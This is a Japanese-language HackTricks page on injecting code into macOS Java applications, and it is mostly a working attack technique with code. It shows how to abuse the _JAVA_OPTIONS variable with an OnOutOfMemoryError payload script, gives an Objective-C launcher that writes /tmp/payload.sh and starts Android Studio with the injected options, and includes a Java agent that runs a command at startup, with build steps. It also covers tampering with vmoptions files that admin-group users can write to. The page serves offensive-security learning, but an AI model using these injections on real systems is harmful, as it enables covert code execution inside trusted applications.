# macOS Java アプリケーションインジェクション

<details>

<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告掲載したい場合**や**HackTricks を PDF でダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラム グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github リポジトリに PR を提出して、あなたのハッキングテクニックを共有する。

</details>

## 列挙

システムにインストールされている Java アプリケーションを見つけます。**Info.plist** 内の Java アプリケーションには、文字列 **`java.`** を含むいくつかの Java パラメータが含まれていることが確認されているため、それを検索できます：
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA\_OPTIONS

環境変数 **`_JAVA_OPTIONS`** は、Javaでコンパイルされたアプリの実行に任意のJavaパラメータを注入するために使用できます：
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
新しいプロセスとして実行し、現在のターミナルの子プロセスとしてではない場合は、次のように使用できます：
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
しかし、実行されたアプリケーションでエラーが発生しますが、もっと隠密な方法はJavaエージェントを作成し、以下を使用することです：
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
{% hint style="danger" %}
アプリケーションと**異なるJavaバージョン**でエージェントを作成すると、エージェントとアプリケーションの両方の実行がクラッシュする可能性があります
{% endhint %}

エージェントは以下のようになります：

{% code title="Agent.java" %}
```java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
```
エージェントをコンパイルするには、以下を実行します:
```
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt`を使って：
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
```markdown
そして、環境変数をエクスポートして、次のようにJavaアプリケーションを実行します:
```
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptionsファイル

このファイルはJavaが実行される際に**Javaパラメータ**を指定することをサポートしています。以前のトリックをいくつか使用してJavaパラメータを変更し、**プロセスに任意のコマンドを実行させる**ことができます。\
さらに、このファイルは`include`ディレクトリを使って**他のファイルを含める**こともできるので、含まれているファイルを変更することも可能です。

さらに、いくつかのJavaアプリケーションは複数の`vmoptions`ファイルを**読み込む**ことがあります。

Android Studioのようなアプリケーションは、これらのファイルをどこで**探しているかを出力で示して**います。例えば：
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
彼らがそうしない場合、以下の方法で簡単にチェックできます:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
以下の例で注目すべき点は、Android Studioがファイル **`/Applications/Android Studio.app.vmoptions`** を読み込もうとしていることです。これは **`admin` グループの任意のユーザーが書き込みアクセス権を持っている場所です。**

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または **HackTricksをPDFでダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や [**telegramグループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
